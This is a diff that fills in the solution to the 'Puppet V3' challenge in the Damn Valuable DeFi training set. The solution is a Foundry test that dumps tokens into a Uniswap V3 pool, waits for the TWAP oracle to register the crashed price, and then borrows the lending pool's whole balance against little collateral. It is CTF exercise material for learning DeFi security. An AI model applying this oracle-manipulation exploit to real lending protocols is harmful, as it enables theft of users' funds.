@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +120,35 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+        // 1. Swap all 110 DVT for WETH to crash the DVT price
+        token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        // 2. Advance time so TWAP incorporates the crashed price
+        skip(110);
+
+        // 3. Wrap remaining ETH to WETH for collateral
+        weth.deposit{value: 1 ether}();
+
+        // 4. Approve WETH and borrow all tokens from the lending pool
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // 5. Transfer all borrowed tokens to recovery
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
